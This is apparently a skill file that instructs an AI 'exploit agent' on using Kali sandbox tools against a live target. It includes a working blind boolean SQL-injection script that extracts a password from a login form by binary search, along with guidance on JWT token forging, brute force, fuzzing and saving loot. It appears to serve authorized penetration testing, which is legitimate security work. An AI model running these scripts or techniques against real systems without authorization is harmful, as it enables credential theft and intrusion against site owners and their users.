---
description: How to use the run_python / execute_bash sandbox tools — when to script vs probe by hand, the binary-search extraction idiom, preinit, and the per-run sandbox model. Load when the exploit agent has code-execution tools.
---

# Code-execution sandbox

`run_python` and `execute_bash` run inside an ephemeral Kali container scoped to
this agent run: `requests`/`httpx`/`pwntools`/`bs4`/`pyjwt` preinstalled, common
CLI tools (`curl`, `jq`, `nmap`, `sqlmap`, `gobuster`), and **host network** (it
reaches the live target). The target source is mounted read-only at `/project`;
the working directory is writable and **persists across calls within this run**,
so files you write are available to later calls and are saved as artifacts.

## When to use it

Reach for code execution the moment a technique needs **many similar requests**
or **non-trivial computation** — that is exactly where issuing one request per
reasoning turn burns the budget and times out.

- **Blind / iterative extraction** (boolean or time-based SQLi, enumeration):
  script the whole extraction in ONE `run_python` call. Use **binary search**
  per byte (≤~8 requests/char over the value range), not a linear scan, and not
  one tool call per character.
- **Brute force / fuzzing / parameter sweeps**: loop in the script, not in the
  conversation.
- **Crypto / encoding / token forging** (JWT alg-confusion, padding, hashing):
  compute in `run_python` with `pyjwt`/`hashlib` rather than by hand.
- **One-off recon**: `execute_bash` for `curl`/`nmap`/`gobuster`.

For a single confirming probe, the normal `http_request` tool is still simpler —
don't spin up a script for one request.

## Oracle first — before any extraction

A blind extraction loop is only as good as its oracle. Before you script the
loop, **prove the oracle differentiates**: send one **known-TRUE** and one
**known-FALSE** condition and confirm the responses actually differ (body,
status, length, or timing). If they look identical, your injection point or
payload is wrong — **fix that first**. Never run an extraction loop on an oracle
you have not proven separates true from false: it just burns the budget
returning garbage, one wrong byte at a time. Calibrate, then extract.

## Idioms

Blind boolean-SQLi extraction (one call replaces hundreds of turns):

```
run_python(code='''
import requests, string
URL = "http://target/login"
charset = string.printable
def oracle(cond):
    r = requests.post(URL, data={"username": f"admin' AND {cond}-- ", "password":"x"})
    return "Welcome" in r.text            # adapt the true-condition signal
# calibrate FIRST: TRUE and FALSE controls must differ, else the injection is wrong
if not (oracle("1=1") and not oracle("1=2")):
    raise SystemExit("oracle does not differentiate — fix the injection, do not extract")
val = ""
for pos in range(1, 41):
    lo, hi = 32, 126
    while lo < hi:                        # binary search this byte
        mid = (lo + hi) // 2
        if oracle(f"ASCII(SUBSTRING(password,{pos},1))>{mid}"): lo = mid + 1
        else: hi = mid
    if lo == 32: break
    val += chr(lo); print(pos, val, flush=True)
print("RECOVERED:", val)
''', timeout_s=120)
```

- **`preinit`**: pass setup snippets (base URL, captured cookies/token, helper
  functions, data from earlier steps) — they run before your code in the same
  interpreter, so the main script stays focused.
- **Persisted files**: write results to the working directory (e.g.
  `open("loot.json","w")`); they're returned and stored as artifacts, and remain
  visible to your next `run_python` / `execute_bash` call in this run.
- **Budget**: each call has its own `timeout_s` — give loops a realistic cap and
  print progress with `flush=True` so partial results survive a timeout.

## Discipline

- Don't re-run an identical script; build on what the previous call produced.
- Stay on the authorized target host. The sandbox is for testing the target, not
  the host it runs on.
